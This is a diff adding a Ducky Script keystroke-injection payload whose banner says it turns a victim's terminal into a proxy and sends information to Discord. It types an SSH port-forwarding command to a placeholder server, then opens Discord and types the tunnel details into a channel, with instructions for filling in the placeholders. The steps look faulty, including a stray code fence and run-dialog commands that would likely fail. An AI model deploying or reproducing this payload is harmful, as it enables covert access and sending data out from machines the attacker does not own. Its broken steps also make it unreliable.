@@ -1,0 +1,46 @@
+REM    Turn a terminal into a Proxy, 
+REM        sends information to discord 
+REM            __            ______           
+REM          /'__`\         /\  ___\          
+REM    __  _/\_\L\ \  __  __\ \ \__/   __  _  
+REM   /\ \/'\/_/_\_<_/\ \/\ \\ \___``\/\ \/'\ 
+REM   \/>  </ /\ \L\ \ \ \_\ \\/\ \L\ \/>  </ 
+REM   /\_/\_\\ \____/\/`____ \\ \____//\_/\_\
+REM   \//\/_/ \/___/  `/___/> \\/___/ \//\/_/
+REM                      /\___/              
+REM                      \/__/               
+
+DELAY 1000                                                                   
+REM Open terminal or command prompt                                          
+GUI r                                                                        
+DELAY 500                                                                    
+STRING terminal                                                              
+ENTER                                                                        
+DELAY 1000                                                                   
+                                                                             
+REM Create SSH tunnel                                                        
+STRING ssh -N -L <local_port>:<remote_host>:<remote_port> <username>@<ssh_server>                                                                         
+ENTER                                                                        
+DELAY 2000                                                                   
+                                                                             
+REM Open Discord and send information                                        
+GUI r                                                                        
+DELAY 500                                                                    
+STRING discord                                                               
+ENTER                                                                        
+DELAY 2000                                                                   
+STRING <discord_channel>                                                     
+ENTER                                                                        
+DELAY 1000                                                                   
+STRING <ssh_tunnel_info>                                                     
+ENTER                                                                        
+```                                                                          
+                                                                             
+REM     Replace the following placeholders with your actual information:             
+REM     - `<local_port>`: The local port number you want to use for the SSH tunnel.  
+REM     - `<remote_host>`: The remote host or IP address you want to connect to through the SSH tunnel.                                                           
+REM     - `<remote_port>`: The port number on the remote host that you want to access.                                                                            
+REM     - `<username>`: Your SSH username.                                           
+REM     - `<ssh_server>`: The SSH server address or IP.                              
+REM     - `<discord_channel>`: The Discord channel where you want to send the information.                                                                        
+REM     - `<ssh_tunnel_info>`: The information you want to send to the Discord channel (e.g., SSH tunnel details).    
